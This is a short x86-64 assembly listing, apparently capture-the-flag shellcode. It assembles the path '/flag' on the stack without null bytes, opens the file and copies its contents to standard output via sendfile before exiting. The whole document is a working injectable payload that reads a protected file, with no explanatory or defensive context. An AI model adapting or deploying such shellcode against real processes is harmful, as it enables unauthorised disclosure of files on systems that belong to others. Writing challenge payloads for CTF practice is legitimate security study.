.globl _start
.intel_syntax noprefix

_start:
    mov ebx, 0x67616c66
    shl rbx, 8
    mov bl, 0x2f
    push rbx
    xor rax, rax
    mov al, 2               # SYS_open
    mov rdi, rsp            # ptr to /flag
    xor rsi, rsi            # O_RDONLY
    syscall

    xor rdi, rdi
    inc rdi                 # fd out
    mov rsi, rax            # fd in
    xor rdx, rdx            # skipped bytes
    mov bl, 88
    mov r10, rbx            # bytes to transfer
    mov al, 40              # SYS_sendfile
    syscall

    mov al, 60              # SYS_exit
    syscall
